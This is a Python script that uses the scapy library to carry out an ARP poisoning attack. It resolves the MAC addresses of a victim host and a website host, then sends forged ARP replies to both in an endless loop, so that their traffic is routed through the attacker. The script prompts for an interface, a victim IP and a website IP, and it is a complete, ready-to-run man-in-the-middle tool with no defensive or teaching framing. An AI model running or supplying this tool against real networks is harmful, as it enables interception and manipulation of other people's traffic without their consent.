import scapy.all as scapy
import time

class ARPPoison:
    def __init__(self, iface, victimIP, websiteIP):
        self.iface = iface
        self.victimIP = victimIP
        self.websiteIP = websiteIP
    
    def get_mac(self, IP):
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=IP)
        pkt = scapy.srp(broadcast, iface=self.iface, timeout=2, verbose=False)[0]
        mac = pkt[0][1].hwsrc
        return mac
    
    def set_mac(self):
        self.victimMAC = self.get_mac(self.victimIP)
        self.websiteMAC = self.get_mac(self.websiteIP)
    
    def poison(self, target, pretend, MAC):
        # Note: Ignore warning when running, adding Ether 'hwdst' will break the poisoning
        packet = scapy.ARP(op=2, hwdst=MAC, pdst=target, psrc=pretend)
        scapy.send(packet, iface=self.iface, verbose=False)
        print(f"> Poisoning {target} as {pretend}")
        
    def attack(self):
        self.set_mac()
        while True:
            self.poison(self.victimIP, self.websiteIP, self.victimMAC)
            self.poison(self.websiteIP, self.victimIP, self.websiteMAC)
            time.sleep(1.0)

if __name__ == "__main__":
    iface = input("> Interface: ")
    victim = input("> Victim IP: ")
    site = input("> Website IP: ")

    spoofer = ARPPoison(iface, victim, site)
    spoofer.attack()